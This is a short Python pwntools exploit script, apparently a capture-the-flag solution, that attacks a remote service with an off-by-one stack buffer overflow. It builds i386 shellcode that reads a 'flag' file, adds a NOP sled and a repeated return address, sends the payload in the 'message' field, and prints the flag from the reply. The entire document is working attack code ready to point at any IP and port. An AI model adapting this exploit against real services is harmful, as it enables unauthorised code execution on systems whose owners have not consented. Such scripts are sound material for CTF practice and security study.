from pwn import *
from sys import argv

def byoneoff(IPaddr, port):

    context.log_level = "error"
    r = remote(IPaddr, int(port))

    catflag = shellcraft.i386.linux.cat('flag')
    shellcode = asm(catflag)

    nop = pwnlib.shellcraft.amd64.nop()
    asmnop = asm(nop)

    buffer_len = 255 #0x0ff

    shellcode_len = len(shellcode) #40

    #ebp_addr = "\x4c\xc5\xff\xff"
    #shellcode_addr = "\x70\xc5\xff\xff"
    addr = "\xbf\x91\x04\x08"
    ebp_overflow = "\x41"

    #print len(shellcode_addr)
    nopsled = asmnop * (buffer_len - shellcode_len - len(addr)*50) #255 - 40 - 4

    username = "root"

    #message = nopsled + shellcode + "\x70\xc5\xff\xff"+"\x70\xc5\xff\xff"+"\x70\xc5\xff\xff"+"\x70\xc5\xff\xff"+"\x70\xc5\xff\xff"
    #+ "\x5c"
    message = addr*50 + nopsled + shellcode + ebp_overflow
    #print message
    r.recvuntil("username:")
    r.send(username+'\n')
    r.recvuntil("message:")
    r.send(message+'\n')
    output = r.recvall()
    if "FLAG" in output:
        pos = output.find("FLAG")
        print output[pos:]

byoneoff(argv[1], argv[2])
